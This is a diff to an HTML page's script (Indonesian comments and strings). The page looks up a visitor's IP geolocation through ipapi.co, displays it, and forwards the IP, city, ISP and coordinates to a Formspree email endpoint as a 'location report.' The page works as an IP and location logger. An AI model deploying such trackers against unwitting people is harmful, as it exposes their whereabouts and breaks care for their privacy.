@@ -35,13 +35,11 @@
             const statusMsg = document.getElementById('statusMsg');
             const result = document.getElementById('result');
 
-            // Reset Tampilan
             loading.classList.remove('hidden');
             statusMsg.classList.add('hidden');
             result.classList.add('hidden');
 
             try {
-                // 1. Ambil data lokasi menggunakan ipapi.co (Mendukung HTTPS secara gratis)
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
 
@@ -49,15 +47,13 @@
                     throw new Error("Gagal mengambil data lokasi.");
                 }
 
-                // Tampilkan data di layar pengguna dengan format API baru
                 document.getElementById('resIP').innerText = data.ip;
-                document.getElementById('resCountry').innerText = `${data.country_name} (${data.country_code})`;
+                document.getElementById('resCountry').innerText = data.country_name + " (" + data.country_code + ")";
                 document.getElementById('resCity').innerText = data.city;
                 document.getElementById('resISP').innerText = data.org;
-                document.getElementById('resCoords').innerText = `${data.latitude}, ${data.longitude}`;
+                document.getElementById('resCoords').innerText = data.latitude + ", " + data.longitude;
                 result.classList.remove('hidden');
 
-                // 2. Kirim data tersebut ke email Anda via Formspree
                 const formspreeUrl = "https://formspree.io/f/xojolajv"; 
 
                 const emailResponse = await fetch(formspreeUrl, {
@@ -67,7 +63,30 @@
                         'Accept': 'application/json'
                     },
                     body: JSON.stringify({
-                        Subject: `Laporan Lokasi Baru dari IP: ${data.ip}`,
+                        Subject: "Laporan Lokasi Baru dari IP: " + data.ip,
                         IP_Address: data.ip,
                         Negara: data.country_name,
-                        Kota
+                        Kota: data.city,
+                        ISP: data.org,
+                        Koordinat: data.latitude + ", " + data.longitude
+                    })
+                });
+
+                if (emailResponse.ok) {
+                    statusMsg.innerText = "✅ Lokasi berhasil dicek & laporan dikirim ke email!";
+                    statusMsg.className = "mt-4 text-sm font-semibold p-3 rounded-lg bg-green-100 text-green-800 text-center";
+                } else {
+                    throw new Error("Gagal mengirim laporan ke email.");
+                }
+
+            } catch (err) {
+                statusMsg.innerText = "❌ Terjadi kesalahan: " + err.message;
+                statusMsg.className = "mt-4 text-sm font-semibold p-3 rounded-lg bg-red-100 text-red-800 text-center";
+            } finally {
+                loading.classList.add('hidden');
+                statusMsg.classList.remove('hidden');
+            }
+        }
+    </script>
+</body>
+</html>
